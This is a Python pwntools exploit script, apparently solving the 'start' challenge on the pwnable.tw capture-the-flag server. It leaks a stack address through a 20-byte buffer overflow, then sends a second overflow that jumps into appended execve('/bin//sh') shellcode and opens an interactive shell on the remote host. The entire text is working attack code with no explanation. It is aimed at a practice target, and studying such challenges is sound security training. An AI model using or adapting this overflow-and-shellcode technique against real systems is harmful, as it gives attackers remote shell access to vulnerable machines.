from pwn import *

e = ELF("./start")

context.binary = e
context.terminal = ["konsole", "-e"]


#p = process([e.path])
p = remote("chall.pwnable.tw", 10000)


#context.log_level="debug"
#gdb.attach(p)


p.recvuntil(":")



sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"



#sc = asm(sc)

print(len(sc))



p.send("A"*20 + p32(0x08048087))

leek = p.recv(4)

stack = u32(leek)

print(hex(stack))

p.send("A"*20 + p32(stack+20) + sc)

p.interactive()
